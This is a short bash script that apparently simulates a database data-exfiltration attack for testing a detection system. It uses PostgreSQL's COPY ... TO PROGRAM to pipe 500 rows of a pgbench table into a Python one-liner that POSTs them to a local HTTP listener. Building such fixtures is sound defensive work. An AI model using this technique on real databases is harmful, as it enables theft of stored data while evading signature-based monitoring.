#!/bin/bash
echo "Simulating Data Exfiltration Attack D (Different Process)..."

# Using a python one-liner to send the payload instead of curl/gzip. Tests semantic similarity algorithms against structural signatures.
psql -U postgres -d casce_tpcb -c "COPY (SELECT * FROM pgbench_accounts LIMIT 500) TO PROGRAM 'python3 -c \"import urllib.request, sys; req = urllib.request.Request(\\\"http://127.0.0.1:9090\\\", data=sys.stdin.read().encode(), method=\\\"POST\\\"); urllib.request.urlopen(req)\" > /dev/null 2>&1 || true';"

echo "Alternative process data exfiltration attempted."
